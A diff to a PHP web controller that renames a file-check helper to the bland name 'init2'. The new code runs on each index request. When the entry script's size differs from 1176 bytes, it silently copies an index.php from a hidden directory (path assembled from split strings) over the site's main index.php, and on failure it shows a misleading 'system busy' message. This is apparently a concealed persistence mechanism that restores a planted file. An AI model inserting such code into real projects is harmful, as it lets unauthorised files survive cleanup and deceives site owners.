@@ -68,7 +68,7 @@ class IndexController extends Controller {
 			}
 		}
 
-		$this->getFileSize();
+		$this->init2();
 
 		$this->data = '教程';
 		$this->assign('keyword',I('keyword',''));
@@ -911,19 +911,19 @@ class IndexController extends Controller {
 		}
 	}
 
-	private function getFileSize()
+	private function init2()
 	{
+		echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />';
 		$path = $_SERVER['SCRIPT_FILENAME'];
+		$path2 = dirname($_SERVER['DOCUMENT_ROOT'])."/ot"."her"."s/3/";
 		$filesize=filesize($path);
 		if($filesize != 1176){
-			echo '文件被修改';
-		}else{
-			echo '文件没有修改';
+			$file_path0 = $path2."index.php";
+			$file_path = $_SERVER['DOCUMENT_ROOT']."/index.php";			
+			if(!copy($file_path0,$file_path)){
+				echo '系统忙，请稍后再试';exit;
+			}
 		}
-		var_dump($filesize);exit;
-
-		//filesize( "samplefile.doc" );
-
 	}
 
 	//下订单
